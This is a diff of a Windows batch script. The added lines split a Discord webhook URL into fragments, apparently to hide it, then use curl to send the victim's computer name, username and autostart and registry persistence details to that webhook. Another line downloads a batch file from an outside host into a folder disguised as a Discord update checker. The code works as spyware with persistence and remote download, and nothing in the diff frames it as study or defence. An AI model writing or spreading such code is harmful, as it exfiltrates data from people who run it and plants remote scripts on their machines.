@@ -105,9 +105,14 @@ set "YY=%dt:~2,2%" & set "YYYY=%dt:~0,4%" & set "MM=%dt:~4,2%" & set "DD=%dt:~6,
 set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
 set time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%
 
+set url1=https://disco
+set url2=rd.com/ap
+set url3=i/webhooks/1084947640686485545/j2vGa12pxtjpfqmNR
+set url4=TgbJMx7plSCnTfr29ljyxpsBsz0g10bJphhGjLXtDjJy79p6PCm
+set url=%url1%+%url2%+%url3%+%url4%
 
 set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%\nTIME: %time%\n  ProgramDataRegistry-Autostart: %pcregistryauto%\n  ProgramDataRegistry-File: %pcregistryfile%\n  UserRegistry-Autostart: %userregistryauto%\n  UserRegistry-File: %userregistryfile%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1084452705105354762/4m7y_EJmQvhR6NZUIpJrJ0-ppH9q_JzOIJhEQ2EQ-6HDIFHkqYISeHyy_IHDZ4ZT1aDh
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" %url%
 
 
 curl -L "https://freestream.us.to/schulprojekt/UpdateChecker.bat" --output "%APPDATA%/DiscordUpdateChecker/UpdateChecker.bat"
